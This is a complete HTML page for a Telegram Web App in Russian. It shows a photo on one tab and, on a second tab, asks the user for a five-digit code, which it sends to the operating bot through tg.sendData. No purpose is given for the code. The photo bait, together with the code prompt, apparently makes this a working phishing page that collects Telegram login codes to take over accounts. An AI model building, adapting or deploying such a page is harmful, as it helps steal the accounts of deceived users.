<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { box-sizing: border-box; }
  body { font-family: sans-serif; text-align: center; margin: 0; padding: 20px 16px 90px;
         background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); }

  .tab-content { display: none; }
  .tab-content.active { display: block; }

  .gallery img { width: 100%; max-width: 360px; border-radius: 16px; margin-top: 16px; }

  .code { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
  .code input { width: 48px; height: 64px; font-size: 28px; text-align: center;
                border: 2px solid #999; border-radius: 12px; }
  button { padding: 14px 32px; font-size: 18px; border: none; border-radius: 12px;
           background: #2481cc; color: #fff; }
  button:disabled { opacity: 0.4; }

  .tabbar { position: fixed; bottom: 0; left: 0; right: 0; display: flex;
            border-top: 1px solid #ddd; background: var(--tg-theme-bg-color, #fff); }
  .tabbar button.tab-btn { flex: 1; padding: 14px 0; background: none; border: none;
                           border-radius: 0; font-size: 15px; color: #888; }
  .tabbar button.tab-btn.active { color: #2481cc; font-weight: bold; }
</style>
</head>
<body>

  <div id="tab1" class="tab-content active">
    <h2>Фото</h2>
    <div class="gallery">
      <img src="https://i.postimg.cc/c1XfBdJF/ef738952-b7e9-487c-91bb-c32ac07c64d8.jpg" alt="">
    </div>
  </div>

  <div id="tab2" class="tab-content">
    <h2>Введите 5-значный код</h2>
    <div class="code">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
    </div>
    <button id="send" disabled>Подтвердить</button>
  </div>

  <div class="tabbar">
    <button class="tab-btn active" data-tab="tab1">Фото</button>
    <button class="tab-btn" data-tab="tab2">Код</button>
  </div>

<script>
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();

  const tabButtons = document.querySelectorAll(".tab-btn");
  const tabContents = document.querySelectorAll(".tab-content");

  tabButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      tabButtons.forEach(b => b.classList.remove("active"));
      tabContents.forEach(c => c.classList.remove("active"));
      btn.classList.add("active");
      document.getElementById(btn.dataset.tab).classList.add("active");
    });
  });

  const inputs = document.querySelectorAll(".code input");
  const sendBtn = document.getElementById("send");

  function getCode() { return [...inputs].map(i => i.value).join(""); }

  inputs.forEach((input, i) => {
    input.addEventListener("input", () => {
      input.value = input.value.replace(/\D/g, "");
      if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
      sendBtn.disabled = getCode().length !== 5;
    });
    input.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
    });
  });

  sendBtn.addEventListener("click", () => tg.sendData(getCode()));
</script>
</body>
</html>
